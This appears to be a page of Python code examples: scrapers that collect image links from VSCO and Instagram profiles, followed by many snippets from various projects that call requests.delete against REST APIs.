            if ((('im.vsco.co' in link) and ('.jpg' in link))):
                messy_links.append('http://'+link)

        #find the uncompressed links to the images provided, and clean them up
        for link in messy_links:
            clean_links.append(link.replace('\\',''))

    #terminate the browsing session
    s.close()

    #return all the decompressed image links
    return clean_links 
**************************************
def scrape_vsco(username):
	#start a new web-browsing session
	s = requests.session()

	#make containers for all the links to be collected
	messy_links, clean_links = [],[]

	#download the user's profile page
	profile_page = s.get('http://vsco.co/'+username)

	#check if account exists
	if '<p class="page-error-heading mt40">This page does not exist</p>' not in profile_page.text:

		#get the unique session id from the site's cookies
		unique_session_id = str(profile_page.cookies).split('vs=')[1]
		unique_session_id = unique_session_id[:unique_session_id.index(' ')]

		#convert the profile page to a string
		profile_page = profile_page.text

		#get the user's unique user id from the profile page
		unique_user_id = profile_page.split('"id":')[1]
		unique_user_id = unique_user_id[:unique_user_id.index(',')]

		#find the user's profile picture link
		profile_picture_link = profile_page.split('responsive_url":"')[1]
		profile_picture_link = profile_picture_link[:profile_picture_link.index('"')]
		
		#add the profile picture link to the list
		messy_links.append('http://'+profile_picture_link)

		#using the session and user id's, download the file containing the links to all pictures ever posted
		user_links_page = s.get('http://vsco.co/ajxp/'+unique_session_id+'/2.0/medias?site_id='+unique_user_id+'&page=1&size=10000').text.split('"')

		#collect the url of every possible jpg picture
		for link in user_links_page:
			if ((('im.vsco.co' in link) and ('.jpg' in link))):
				messy_links.append('http://'+link)

		#find the uncompressed links to the images provided, and clean them up
		for link in messy_links:
			clean_links.append(link.replace('\\',''))

	#terminate the browsing session
	s.close()

	#return all the decompressed image links
	return clean_links 
**************************************
def scrape_instagram(username):
	#start a new web-browsing session
	s = requests.session()

	#make containers for all the links to be collected
	messy_links, clean_links = [],[]

	#download the user's profile page
	profile_page = s.get('http://instagram.com/'+username).text

	#check if account exists
	if '<body class=" p-error dialog-404">' not in profile_page:

		#test if the user's account is private
		if '"is_private": true' in profile_page:
			user_links_page = profile_page.split('"')

		#otherwise, get all the other images
		else:
			profile_page = profile_page.split('"owner": {"id": "')

			#get the user's unique user id from the profile page
			unique_user_id = profile_page[1][:profile_page[1].index('"')]

			#get the dynamically created javascript file's temporary unique pathway
			unique_commons_js = profile_page[len(profile_page)-1].split('en_US_Commons.js/')[1]
			unique_commons_js = unique_commons_js[:unique_commons_js.index('.js')]

			#download the dynamically generated javascript page to get the unique session id
			javascript_page = s.get('https://www.instagram.com/static/bundles/en_US_Commons.js/'+unique_commons_js+'.js')
			javascript_page = javascript_page.text.split('return e.profilePosts.byUserId.get(t).pagination},queryId:"')[1]

			#get the unique session id from the javascript page
			unique_session_id = javascript_page[:javascript_page.index('"')]

			#using the session and user id's, download the file containing the links to all pictures ever posted
			user_links_page = s.get('https://www.instagram.com/graphql/query/?query_id='+unique_session_id+'&id='+unique_user_id+'&first=1000000')
			user_links_page = user_links_page.text.split('"')

		#collect the url of every possible jpg picture
		for link in user_links_page:
			if '.jpg' in link:
				messy_links.append(link)

		#find the uncompressed links to the images provided, and clean them up
		for link in messy_links:
			segmented_link = link.split('/')
			unique_post_id = link[::-1][:link[::-1].index('/')][::-1]
			clean_link = 'https://'+segmented_link[2]+'/'+segmented_link[3]+'/'+unique_post_id
			if clean_link not in clean_links:
				clean_links.append(clean_link)

	#terminate the browsing session
	s.close()

	#return all the decompressed image links
	return clean_links 

Python requests.delete() Examples

**************************************
def _send_raw_http_request(self, method, url, data=None):
        self.__logger.debug('%s %s' % (method, url))
        if method in ['POST', 'PUT', 'PATCH']:
            self.__logger.log(TINTRI_LOG_LEVEL_DATA, 'Data: %s' % data)

        headers = {'content-type': 'application/json'}
        if self.__session_id:
            headers['cookie'] = 'JSESSIONID=%s' % self.__session_id

        if method in ['GET', 'POST', 'PUT', 'PATCH', 'DELETE']:
            if method == 'GET': httpresp = requests.get(url, headers=headers, verify=False)
            elif method == 'POST': httpresp = requests.post(url, data, headers=headers, verify=False)
            elif method == 'PUT': httpresp = requests.put(url, data, headers=headers, verify=False)
            elif method == 'PATCH': httpresp = requests.patch(url, data, headers=headers, verify=False)
            elif method == 'DELETE': httpresp = requests.delete(url, headers=headers, verify=False)
            self._httpresp = httpresp # self._httpresp is for debugging only, not thread-safe
            return httpresp
        else:
            raise TintriError(None, message='Invalid HTTP method: ' + method) # This should never happen 
**************************************
def run(self):
        
        if os.stat("{date}.mrc.bz2".format(date=self.date)).st_size > 0:
            path="{date}-data".format(date=self.date)
            for index in os.listdir(path):
                for f in os.listdir(path+"/"+index):
                    cmd="esbulk -z -verbose -server {host} -w {workers} -index {index} -type schemaorg -id identifier {fd}".format(**self.config,index=index,fd=path+"/"+index+"/"+f)
                    output=shellout(cmd)
        #for f in os.listdir(path+"/resources"):
        #    cmd=". ~/git/efre-lod-elasticsearch-tools/init_environment.sh && "
        #    cmd+="~/git/efre-lod-elasticsearch-tools/processing/merge2move.py -server {host} -stdin < {fd} | ".format(**self.config,fd=path+"/resources/"+f)
        #    cmd+="~/git/efre-lod-elasticsearch-tools/enrichment/sameAs2id.py  -searchserver {host} -stdin  | ".format(**self.config,fd=path+"/resources/"+f)
        #    cmd+="esbulk -verbose -server {rawdata_host} -w {workers} -index {index} -type schemaorg -id identifier".format(**self.config,index="resources-fidmove")
        #    output=shellout(cmd)
        put_dict("{host}/date/actual/4".format(**self.config),{"date":str(self.now)})
        with gzip.open("slub_resources_sourceid0.ldj","wt") as outp:
            for record in esgenerator(host="{host}".format(**self.config).rsplit("/")[2].rsplit(":")[0],port="{host}".format(**self.config).rsplit("/")[2].rsplit(":")[1],index="resources",type="schemaorg",body={"query":{"bool":{"must":[{"match":{"offers.offeredBy.branchCode.keyword":"DE-14"}},{"match":{"_sourceID.keyword":"0"}}]}}},headless=True):
                print(json.dumps(record),file=outp)
        #delete("{host}/slub-resources/schemaorg".format(**self.config))
        #put_dict("{host}/slub-resources".format(**self.config),{"mappings":{"schemaorg":{"date_detection":False}}})
        #cmd="esbulk -z -verbose -server {host} -w {workers} -index slub-resources -type schemaorg -id identifier slub_resources_sourceid0.ldj".format(**self.config)
        #output=shellout(cmd) 
**************************************
def autoscale(self, proc_type, autoscale):
        """
        Set autoscale rules for the application
        """
        name = '{}-{}'.format(self.id, proc_type)
        # basically fake out a Deployment object (only thing we use) to assign to the HPA
        target = {'kind': 'Deployment', 'metadata': {'name': name}}

        try:
            # get the target for autoscaler, in this case Deployment
            self._scheduler.hpa.get(self.id, name)
            if autoscale is None:
                self._scheduler.hpa.delete(self.id, name)
            else:
                self._scheduler.hpa.update(
                    self.id, name, proc_type, target, **autoscale
                )
        except KubeHTTPException as e:
            if e.response.status_code == 404:
                self._scheduler.hpa.create(
                    self.id, name, proc_type, target, **autoscale
                )
            else:
                # let the user know about any other errors
                raise ServiceUnavailable(str(e)) from e 
**************************************
def delete_listen_key(self, listen_key):
        """
        Delete a specific listen key

        :param listen_key: the listenkey you want to delete
        :type listen_key: str

        :return: the response
        :rtype: str or False
        """
        logging.debug("BinanceWebSocketApiRestclient->delete_listen_key(" + str(listen_key) + ")")
        method = "delete"
        try:
            return self._request(method, self.path_userdata, False, {'listenKey': str(listen_key)})
        except KeyError:
            return False
        except TypeError:
            return False 
**************************************
def delete_post(self, pk, force=False):
        """
        Delete a Post.

        Arguments
        ---------

        pk : int
            The post id you want to delete.
        force : bool
            Whether to bypass trash and force deletion.
        """
        resp = self._delete('posts/{0}'.format(pk), params=locals())

        if resp.status_code == 200:
            return True
        else:
            raise Exception(resp.json())

    # Post Reivion Methods 
**************************************
def delete_request(common_name, user="root"):
    # Validate CN
    if not re.match(const.RE_COMMON_NAME, common_name):
        raise ValueError("Invalid common name")

    path, buf, csr, submitted = get_request(common_name)
    os.unlink(path)

    logger.info("Rejected signing request %s by %s" % (
        common_name, user))

    # Publish event at CA channel
    push.publish("request-deleted", common_name)

    # Write empty certificate to long-polling URL
    requests.delete(
        config.LONG_POLL_PUBLISH % hashlib.sha256(buf).hexdigest(),
        headers={"User-Agent": "Certidude API"}) 
**************************************
def _call(self, method, endpoint, payload=None):
        """
        Call the endpoint and return the response
        """
        resp = None
        shuffle(self.hosts)
        for index in xrange(len(self.hosts)):
            url = "http://%s/v1%s" % (self.hosts[index], endpoint)
            req_args = {'timeout': 10, 'headers': {'Content-Type': 'application/json'}}
            try:
                if method == _GET:
                    resp = requests.get(url, **req_args)
                elif method == _POST:
                    resp = requests.post(
                        url, data=payload, **req_args)
                elif method == _DELETE:
                    resp = requests.delete(url, **req_args)
                break
            except requests.exceptions.RequestException:
                continue
        if resp is None:
            raise DkronClientException("No valid host found")
        return resp 
**************************************
def api_call_delete(self, uri, data='{}'):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.delete(cf_api_url + uri, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if not api_result['success']:
            raise self.APIError(api_result['errors'])
        return api_result 
**************************************
def unsubscribe(self, user_id):
        """Unsubscribe the given user.

        Args:
            user_id: ID of the user to unsubscribe.

        Returns: If successful, returns the ID of the unsubscribed user.

        """
        request_url = API_URL + 'users/' + str(user_id) + '/subscriptions'
        r = requests.delete(url=request_url, cookies={'jwt_token': self.jwt})

        json_response = r.json()
        removed_subscription = json_response['removedSubscription']

        return removed_subscription

    # --- Deck CRUD 
**************************************
def delete_deck(self, deck_id):
        """Delete an existing deck.

        Args:
            deck_id (str): The ID of the Deck to delete.

        Returns:
            Deck: The deleted Deck object if deletion was successful.

        """
        if not isinstance(deck_id, str):
            raise ValueError("'deck_id' parameter must be of type str")

        headers = DEFAULT_HEADERS

        r = requests.delete(url=API_URL + 'decks/' + deck_id, headers=headers,
                            cookies={'jwt_token': self.jwt})

        json_data = r.json()
        deleted_deck = json_converter.json_to_deck(json_data)

        return deleted_deck

    # --- Favorites CR(U)D 
**************************************
def remove_favorite(self, user_id, favorite_id):
        """Add a deck to the current user's favorites.

        Args:
            user_id (int): ID of the user to favorite the deck for.
            favorite_id (str): The ID of the favorite to be removed.

        Returns:
            str: The ID of the removed favorite.

        """
        request_url = API_URL + 'users/%d/favorites/%s' % (user_id,
                                                           favorite_id)
        r = requests.delete(url=request_url, cookies={'jwt_token': self.jwt})

        json_response = r.json()
        removed_favorite_id = json_response['removedFavoriteId']

        return removed_favorite_id

    # --- Search 
**************************************
def del_user(self, username, asserts_in=None):
        """ Delete user.

        Name:        "DELETE_users",
        Method:      "DELETE",
        Pattern:     "users/{username}",

        Args:
            username: name of user that is going to be deleted
            asserts_in: assert values for this call and this method
        """
        pattern = "users/{}".format(username)
        request = requests.delete(
            CONF.config["usmqe"]["api_url"] + pattern,
            auth=self._auth)
        self.print_req_info(request)
        self.check_response(request, asserts_in) 
**************************************
def send_msg(self, _type, url, message, **kwargs):
        response = None
        try:
            if _type == 'post':
                response = requests.post(url, headers=WebClient.headers, data=message, **kwargs)
            elif _type == 'put':
                response = requests.put(url, headers=WebClient.headers, data=message, **kwargs)
            elif _type == 'get':
                response = requests.get(url, headers=WebClient.headers, data=message, **kwargs)
            else:
                response = requests.delete(url, headers=WebClient.headers, data=message, **kwargs)
        except requests.RequestException as exception:
            logger.info('Requests fail - exception %s', exception)
            response = None
        finally:
            reply = self.__process_msg_response(response)
            logger.info('Requests - response %s', response)
            if reply:
                return reply.text
            return reply 
**************************************
def disconnect(self):
        '''
        Description: Disconnection method.
        Input:       No input
        Output:      Two possible values:
                 (0, error_info): Unsucessful disconnection, error_info contain the cause of the error
                 (1, 'Disconnection sucessful): Sucessful disconnection
        '''
        url = 'https://%s/php/session.php' % self.atdserver

        try:
            r = requests.delete(url, headers=self.sessionhdr, verify=False)
        except Exception as e:
            error_info = 'Error disconnecting from ATD:\n %s' % e
            return (0, error_info)
        if r.status_code == 200:
            server_info = json.loads(r.content)

            if server_info['success'] is True:
                return(1, 'Disconnection successful')
            else:
                error_info = 'Error disconecting from ATD - Check credentials or content type header'
                return(0, error_info)
        else:
            error_info = 'Error disconnection from ATD, Status Code: %d' % r.status_code
            return(0, error_info) 
**************************************
def delete(self):
        reply = requests.delete("%s/job/%d" % (self.url, self.id))
        if reply.status_code != 200:
            try:
                message = reply.json()["message"]
            except ValueError:
                message = reply.content
            raise RuntimeError("Server returned error code %d: %s" % (reply.status_code, message)) 
**************************************
def sendSignedDeleteRequest(self, uri):
        r = requests.delete(self.endpoint + uri, auth=self.auth) 
**************************************
def deleteAlbum(self,gid,albumId):
        header = {
            "Content-Type" : "application/json",
            "X-Line-Mid" : self.mid,
            "x-lct": self.channel_access_token,

        }
        r = requests.delete(
            "http://" + self.host + "/mh/album/v3/album/" + albumId + "?homeId=" + gid,
            headers = header,
            )
        return r.json() 
**************************************
def stop(self):
        super().stop()
        if self.server_impl == 'flask':
            requests.delete('http://localhost:{port}/_shutdown'.format(port=str(self.port)))
        elif self.server_impl == 'gevent' and self.server:
            self.server.stop() 
**************************************
def deleteAlbum(self,gid,albumId):
        header = {
            "Content-Type" : "application/json",
            "X-Line-Mid" : self.mid,
            "x-lct": self.channel_access_token,

        }
        r = requests.delete(
            "http://" + self.host + "/mh/album/v3/album/" + albumId + "?homeId=" + gid,
            headers = header,
            )
        return r.json() 
**************************************
def delete(self):
        return requests.delete(self.current_url) 
**************************************
def run(self):
        r=delete("{server}/{index}".format(**self.config))
        put_dict("{server}/{index}".format(**self.config),{"mappings":{"{type}".format(**self.config):{"properties":{"location":{"type":"geo_point"}}}}})
        cmd="esbulk -z -server {server} -index {index} -type {type} -w {workers} -id id -verbose {file}.ldj.gz".format(**self.config)
        output=shellout(cmd) 
**************************************
def run(self):
        #delete("{rawdata_host}/kxp-tit-{date}".format(**self.config,date=self.yesterday.strftime("%y%m%d")))
        #delete("{rawdata_host}/kxp-lok-{date}".format(**self.config,date=self.yesterday.strftime("%y%m%d")))
        cmd=". ~/git/efre-lod-elasticsearch-tools/init_environment.sh && ~/git/efre-lod-elasticsearch-tools/processing/esmarc.py  -z -server {rawdata_host}/kxp-de14/mrc -idfile ids.txt -prefix {date}-kxp".format(**self.config,date=self.yesterday.strftime("%y%m%d"))
        output=shellout(cmd)
        sleep(5) 
**************************************
def run(self):
        with open("{date}-toDelete.txt".format(date=self.date),"r") as inp:
            for url in inp:
                print(url.strip())
                #delete(url.strip()) 
**************************************
def delete(self, *args, **kwargs):
        """Delete this application including all containers"""
        self.log("deleting environment")
        try:
            # check if namespace exists
            self._scheduler.ns.get(self.id)

            try:
                self._scheduler.ns.delete(self.id)

                # wait 30 seconds for termination
                for _ in range(30):
                    try:
                        self._scheduler.ns.get(self.id)
                    except KubeHTTPException as e:
                        # only break out on a 404
                        if e.response.status_code == 404:
                            break
            except KubeException as e:
                raise ServiceUnavailable('Could not delete Kubernetes Namespace {} within 30 seconds'.format(self.id)) from e  # noqa
        except KubeHTTPException:
            # it's fine if the namespace does not exist - delete app from the DB
            pass

        self._clean_app_logs()
        return super(App, self).delete(*args, **kwargs) 
**************************************
def _clean_app_logs(self):
        """Delete application logs stored by the logger component"""
        try:
            url = 'http://{}:{}/logs/{}'.format(settings.LOGGER_HOST,
                                                settings.LOGGER_PORT, self.id)
            requests.delete(url)
        except Exception as e:
            # Ignore errors deleting application logs.  An error here should not interfere with
            # the overall success of deleting an application, but we should log it.
            err = 'Error deleting existing application logs: {}'.format(e)
            self.log(err, logging.WARNING) 
**************************************
def _update_application_service(self, namespace, app_type, port, routable=False, annotations={}):  # noqa
        """Update application service with all the various required information"""
        service = self._fetch_service_config(namespace)
        old_service = service.copy()  # in case anything fails for rollback

        try:
            # Update service information
            for key, value in annotations.items():
                if value is not None:
                    service['metadata']['annotations']['router.deis.io/%s' % key] = str(value)
                else:
                    service['metadata']['annotations'].pop('router.deis.io/%s' % key, None)
            if routable:
                service['metadata']['labels']['router.deis.io/routable'] = 'true'
            else:
                # delete the annotation
                service['metadata']['labels'].pop('router.deis.io/routable', None)

            # Set app type selector
            service['spec']['selector']['type'] = app_type

            # Find if target port exists already, update / create as required
            if routable:
                for pos, item in enumerate(service['spec']['ports']):
                    if item['port'] == 80 and port != item['targetPort']:
                        # port 80 is the only one we care about right now
                        service['spec']['ports'][pos]['targetPort'] = int(port)

            self._scheduler.svc.update(namespace, namespace, data=service)
        except Exception as e:
            # Fix service to old port and app type
            self._scheduler.svc.update(namespace, namespace, data=old_service)
            raise ServiceUnavailable(str(e)) from e 
**************************************
def delete_ip(self,ip_id):
    """
    Deletes the IP associated with the supplied CRITs GUID
    Depending on the type of error, the function will either exit or return False.

    :param ip_id: The CRITs GUID for the IP that will be deleted.
    :type ip_id: str
    :returns: boolean
    """

    if ip_id == None or ip_id == "":
      print "An IP ID must be supplied to delete_ip!"
      exit(1)

    url = self.CRITs_URL + 'ips/' + ip_id + '/' + '?username=' + self.username + '&api_key=' + self.api_key 

    data = {}

    try:
      r = requests.delete(url, data=data, verify=self.verify)
    except requests.exceptions.ConnectionError as e:
      print "delete_ip error: Could not connect to " + url
      exit(1)
    except requests.exceptions.Timeout:
      print "delete_ip error: Timeout connecting to " + url
      exit(1)

    #if self.debug:
    #  print ">>>delete_ip response<<<\n"
    #  print r.text

    if r.status_code == 200:
      if self.debug:
        print "Successfully deleted "+ ip_id
      return (True)
    elif self.debug:
      print "Error with deleting IP GUID: " + ip_id + " : " + str(r.status_code)
      print r.text

    return (False) 
**************************************
def delete_campaign(self,c_id):
    """
    Deletes the Campaign associated with the supplied CRITs GUID.
    Depending on the type of error, the function will either exit or return False.

    :param c_id: The CRITs campaign GUID for deletion.
    :type c_id: str
    :returns: boolean
    """

    if c_id == None or c_id == "":
      print "A campaign ID must be supplied to delete_campaign!"
      exit(1)

    url = self.CRITs_URL + 'campaigns/' + c_id + '/' + '?username=' + self.username + '&api_key=' + self.api_key 

    data = {}

    try:
      r = requests.delete(url, data=data, verify=self.verify)
    except requests.exceptions.ConnectionError as e:
      print "delete_campaign error: Could not connect to " + url
      exit(1)
    except requests.exceptions.Timeout:
      print "delete_campaign error: Timeout connecting to " + url
      exit(1)

    #if self.debug:
    #  print ">>>delete_campaign response<<<\n"
    #  print r.text

    if r.status_code == 200:
      if self.debug:
        print "Successfully deleted "+ c_id
      return (True)
    elif self.debug:
      print "Error with campaign deletion: " + c_id + " : " + str(r.status_code)
      print r.text

    return (False) 
**************************************
def _delete(self, endpoint, params={}):
        """
        Private function for making DELETE requests.

        Arguments
        ---------

        endpoint : str
            WordPress endpoint.
        params : dict
            HTTP parameters when making the connection.

        Returns
        -------

        dict/list
            Returns the data from the endpoint.
        """
        url = urljoin(self.url, 'wp', self.version, endpoint)

        resp = requests.delete(url, params=params, headers=self.headers)

        if not resp.status_code == 200:
            msg = ('WordPress REST API returned the status code '
                   '{0}.'.foramt(resp.status_code))
            raise Exception(msg)

        return resp.json()

    # Post Methods 
**************************************
def ensure_application_release_removed(repository_name, release_version):
    api = f'https://quay.io/cnr/api/v1/packages/' \
          f'{quay_namespace}/{repository_name}/{release_version}/helm'
    headers = {
        'Content-Type': 'application/json',
        'Authorization': quay_access_token
    }
    res = requests.delete(api, headers=headers)
    assert res.status_code == 200 
**************************************
def _delete_request(
        request_url: str,
        requests_data: typing.Dict[str, typing.Any],
        request_header: typing.Dict[str, str],
    ) -> requests.Response:
        return requests.delete(request_url, headers=request_header) 
**************************************
def __remove_file(self, url):
        """
        remove a file in the Selenoid node
        """
        requests.delete(url) 
**************************************
def __init__(self, config):
        if not have_requests:
            raise ImportError('requests module required for RequestsTransport')
        TransportBase.__init__(self, config, self.__module__)
        self.REQ_MAP = {
            'GET': requests.get,
            'POST': requests.post,
            'DELETE': requests.delete,
            'PUT': requests.put
        }
        self._timeout = self._config.get('timeout', None)
        if isinstance(self._timeout, list) and len(self._timeout) == 2:
            self._timeout = tuple(self._timeout) 
**************************************
def delete(self, api_obj, data=None, obj_id=0, url_params=''):
        if not obj_id and data:
            obj_id = data['id']
        if url_params:
            url_params = '?' + url_params.lstrip("?")
        if not obj_id:
            raise TypeError("Missing object data or id.")
        url = self.server + '/' + api_obj + '/' + str(obj_id) + url_params
        r = requests.delete(url, headers=self.tokenHeaderJson, verify=self.sslVerify)
        return self.__check_result(r) 
**************************************
def rest_api_delete(self, rest_url, api_version):
        """
        DELETE request to the REST API - Not tested
        :return: JSON string of the DELETE response
        """
        response = requests.delete(
            "{org_instance}/services/data/v{api_version}/{rest_url}".format(
                org_instance=self.instance, api_version=api_version, rest_url=rest_url
            ),
            headers=self.sf_headers
        )

        return response 
**************************************
def specific_user_route(email):
    """
    Delete a particular user.

    :reqheader Content-Type: application/json
    :resheader Content-Type: application/json
    :resjson string email: The email address of the deleted user.
    :status 200: The user has been deleted.
    :status 404: There is no user with the given ``email``.
    """
    user = load_user_from_id(email)

    if user is None:
        return jsonify(
            title='The requested user does not exist.',
            detail='No user exists with the email "{email}"'.format(
                email=email),
        ), codes.NOT_FOUND

    requests.delete(
        urljoin(STORAGE_URL, '/users/{email}'.format(email=email)),
        headers={'Content-Type': 'application/json'},
    )

    return_data = jsonify(email=user.email)
    return return_data, codes.OK 
**************************************
def _delete(self, endpoint, params=None):
        response = requests.delete(self.BASE_URL + endpoint, params=params, auth=(self.user, self.password))
        return self._parse(response) 
**************************************
def clean_consul(port, token=''):
    # remove all data from the instance, to have a clean start
    base_uri = 'http://127.0.0.1:%s/v1/' % port
    params = {'recurse': 1}
    if token:
        params['token'] = token
    requests.delete(base_uri + 'kv/', params=params)
    services = requests.get(base_uri + 'agent/services',
                            params=params).json().keys()
    for s in services:
        requests.put(base_uri + 'agent/service/deregister/%s' % s)

    if token:
        acl_tokens = requests.get(base_uri + 'acl/list', params=params).json()
        for t in acl_tokens:
            if t['ID'] != token:
                requests.put(base_uri + 'acl/destroy/%s' % t['ID'],
                             params=params)

        acl_policys = requests.get(base_uri + 'acl/policies',
                                   params=params).json()
        for pls in acl_policys:
            if pls['ID'] != token:
                requests.delete(base_uri + 'acl/policy/%s' % pls['ID'],
                                params=params)

        acl_roles = requests.get(base_uri + 'acl/roles',
                                 params=params).json()
        for role in acl_roles:
            if role['ID'] != token:
                requests.delete(base_uri + 'acl/role/%s' % role['ID'],
                                params=params) 
**************************************
def _delete(self, endpoint):
        req_url = self.BASE_URL + endpoint
        r = requests.delete(req_url, headers=self._headers)
        validate_response(r, 200, KieferClientError)
        return r.json() 
**************************************
def _delete(self, request, headers=None):
        url = '{0}{1}'.format(self._url(), request)
        headers = self.headers if headers is None else headers
        response = requests.delete(url, headers=headers, verify=self.verify_cert, timeout=self.timeout)
        return self._validate(response) 
**************************************
def jsond(url, *arg):
    """
    自动将 DELETE 请求转换为 JSON
    """
    if url.__class__.__name__ == 'function':
        url = url()
    try:
        return json_moudle.loads(requests.delete(url, headers=Session.headers,
                                                 verify=verify, timeout=3, *arg).text)
    except json_moudle.decoder.JSONDecodeError as e:
        log(f'JSON 解析错误,请检查知乎 API 的 URL 是否变化,当前 URL 为:{url}') 
**************************************
def dns_records_delete(self, zone_id, record_id):
        """
        https://api.cloudflare.com/#dns-records-for-a-zone-delete-dns-record
        :param zone_id:
        :param record_id:
        :return:
        """
        uri = "zones/" + str(zone_id) + "/dns_records/" + str(record_id)

        return self.api_call_delete(uri, data=False)

    ##########################################################################
    # CloudFlare IPs (https://api.cloudflare.com/#cloudflare-ips-properties) #
    ########################################################################## 
**************************************
def unreject_user(self, user_id):
        """ Un-decline user
            :user_id id of the user to unreject
        """

        # Create and send HTTP DELETE to Happn server
        h = headers
        h.update({
            'Authorization' : 'OAuth="'+ self.oauth + '"',
            'Content-Type'  : 'application/x-www-form-urlencoded; charset=UTF-8',
            'Content-Length': '20'
        })
        payload = {
            'id' :  user_id
        }
        url = 'https://api.happn.fr/api/users/me/rejected/'+str(user_id)
        try:
            r = requests.delete(url, headers=h, data = payload,verify=False)
        except Exception as e:
            raise HTTP_MethodError('Error Connecting to Happn Server: {}'.format(e))

        if r.status_code == 200: #200 = 'OK'
            logging.info('Un-declined User '+str(user_id))

        else:
            # Unable to fetch distance
            raise HTTP_MethodError(httpErrors[r.status_code]) 
**************************************
def runHttpRequest(self, url, headers, data, type, text):
        if type == "delete":
            res = requests.delete(url, headers=headers, verify=False)
        elif type == "post":
            res = requests.post(url, headers=headers, verify=False, data=data)
        elif type == "get":
            res = requests.get(url, headers=headers, verify=False)
        
        if (res.status_code != requests.codes.ok and res.status_code != 201):
            logger.error("Unexpected response code while %s, on url=%s, statuscode=%s reason=%s, response=\"%s\", payload=\"%s\"" % (text, url, res.status_code, res.reason, res.text, data))
            self.response.write("Error unexpected response code while %s, on url %s, statuscode %s reason %s, response \"%s\", payload=\"%s\"" % (text, url, res.status_code, res.reason, res.text, data))
            return
        
        return res 
**************************************
def _request(self, verb, endpoint, data=None):
        """Request a url.

        :param endpoint: The api endpoint we want to call.
        :param verb: POST, GET, or DELETE.
        :param params: Optional build parameters.

        :type params: dict

        :raises requests.exceptions.HTTPError: When response code is not successful.

        :returns: A JSON object with the response from the API.
        """

        headers = {
            'Accept': 'application/json',
        }
        auth = HTTPBasicAuth(self.token, '')
        resp = None

        request_url = "{0}/{1}".format(self.url, endpoint)

        if verb == 'GET':
            resp = requests.get(request_url, auth=auth, headers=headers)
        elif verb == 'POST':
            resp = requests.post(request_url, auth=auth, headers=headers, json=data)
        elif verb == 'DELETE':
            resp = requests.delete(request_url, auth=auth, headers=headers)
        else:
            raise BadVerbError(verb)

        resp.raise_for_status()

        return resp.json() 
**************************************
def delete(self, url=None, **kwargs):
        ''' 删除当前实例对应的数据
        '''
        url = url or self.url
        return requests.delete(url, **kwargs) 
**************************************
def delete_indice(self, indice_id):
        return self.delete(self.format_url_indice(indice_id)) 
**************************************
def clean(self, **kwargs):
        '''清理kibana 在 Elasticsearch dashboard 或者visualization 下的所有数据
        '''
        return requests.delete(os.path.dirname(self.url), **kwargs) 
**************************************
def delete(self, url):
        return requests.delete(url, headers=self.headers()) 
**************************************
def remove_branch(self):
        res = self.delete("https://api.github.com/repos/%s/git/refs/heads/%s" % (self.repo, self.branch))
        logging.debug(res) 
**************************************
def exec_pdns_api(self, action, url, json_data=None, text=False):

        # remove double: //
        url = url.replace(r'//', '/')
        # remove extra ^/
        if url[0] == '/':
            url = url[1:]

        call_url = self.url_base + '/' + url

        headers = {'X-API-Key': self.key} 

        if action == 'GET':
            r = requests.get(call_url, headers=headers)
        elif action == 'POST':
            r = requests.post(call_url, data=json_data, headers=headers)
        elif action == 'PATCH':
            r = requests.patch(call_url, data=json_data, headers=headers)
        elif action == 'DELETE':
            r = requests.delete(call_url, headers=headers)
        else:
            raise ValueError('action unknown: %s' % action)

        if r.ok:
            if action == 'GET':
                if text:
                    return r.text
                else:
                    return r.json()
            else:
                return r
        else:
            raise ValueError('url returned an error: %s:\n%s\n---\n%s' % (call_url, r.headers, r.text)) 
**************************************
def _send_request(method, url, params, data, **settings):
        if method == TestMethod.GET:
            return requests.get(url=url, params=params, **settings)
        elif method == TestMethod.PUT:
            return requests.put(url=url, data=data, **settings)
        elif method == TestMethod.POST:
            return requests.post(url=url, data=data, **settings)
        elif method == TestMethod.PATCH:
            return requests.patch(url=url, data=data, **settings)
        elif method == TestMethod.DELETE:
            return requests.delete(url=url, **settings)
        else:
            raise UnsupportedMethodError('Unsupported method: %s' % method) 
**************************************
def _execute_call(self, url, method='get', data=None):
        try:
            self.logger.info('Calling {}'.format(url))
            requests.packages.urllib3.disable_warnings()
            url_base = 'https://{0}:{1}/restconf/data/'.format(self.host, self.port)
            headers = {
            'Accept': 'application/yang-data+json',
            'content-type': 'application/yang-data+json'
            }
            if method == 'get':
                response = requests.get(url_base+url, auth=(self.username, self.password), headers=headers, verify=False)
            elif method == 'patch':
                response = requests.patch(url_base+url, auth=(self.username, self.password), headers=headers, verify=False, data=json.dumps(data, ensure_ascii=False))
            elif method == 'delete':
                response = requests.delete(url_base+url, auth=(self.username, self.password), headers=headers, verify=False, data=json.dumps(data, ensure_ascii=False))

            result = Result(response=response)
            result.status_code = response.status_code

            if response.status_code in HTTP_ERROR_CODES:
                result.ok = False
                result.error = HTTP_ERROR_CODES[response.status_code]

            elif response.status_code in HTTP_SERVER_ERRORS:
                result.ok = False
                result.error = HTTP_SERVER_ERRORS[response.status_code]

            elif response.status_code in HTTP_SUCCESS_CODES:
                result.ok = True
                result.message = HTTP_SUCCESS_CODES[response.status_code]

            if not response.status_code == 204:
                result.json = response.json()

            return result

                #response = requests.get(url, auth=(USER, PASS), headers=headers, verify=False)
        except Exception as e:
            self.logger.error(e) 
**************************************
def delete_access_group(self, interface):
        """Function to delete a IP accessgroup on IOS XE"""
        parsed_interface =re.search(r"(?P<intrfname>[A-Za-z]+)(?P<intf_num>\d((/\d+)+(\.\d+)?)|\d)",interface).groupdict()
        interface_name = parsed_interface.get('intrfname')
        interface_number = parsed_interface.get('intf_num')
        api_interface = '{0}={1}'.format(interface_name, interface_number)
        url = 'https://{0}:{1}/data/Cisco-IOS-XE-native:native/interface/{2}/ip/access-group/in/acl'.format(self.host, self.port, api_interface)
        headers = {
        'Accept': 'application/yang-data+json',
        'content-type': 'application/yang-data+json'
        }

        data = {}
        response = self._execute_call('Cisco-IOS-XE-native:native/interface/{0}/ip/access-group/in/acl'.format(api_interface), method='delete', data=json.dumps(data))
        return response 
**************************************
def delete(self, token):
        resp = requests.delete("https://trello.com/1/tokens/%s" % (token), params=dict(key=self._apikey, token=self._token), data=None)
        resp.raise_for_status()
        return resp.json() 
**************************************
def delete(self, card_id_or_shortlink):
